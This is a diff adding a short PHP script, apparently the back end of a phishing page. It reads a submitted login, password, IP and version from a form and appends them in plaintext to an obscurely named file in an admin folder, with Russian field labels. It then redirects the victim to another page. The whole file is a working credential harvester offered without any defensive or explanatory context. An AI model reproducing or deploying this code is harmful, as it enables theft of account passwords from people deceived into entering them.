@@ -1,0 +1,11 @@
+﻿<?PHP
+$login = $_POST['login']; 
+$pass = $_POST['pass']; 
+$ip = $_POST['ip']; 
+$vers = $_POST['vers']; 
+
+$log = fopen("admin/1357924680","a+"); 
+fwrite($log,"\nНик: [$login] ; Пароль: [$pass] ; IP: [$ip] ; Версия: [$vers] \n "); 
+fclose($log);
+header('Location: /end.php');
+?>
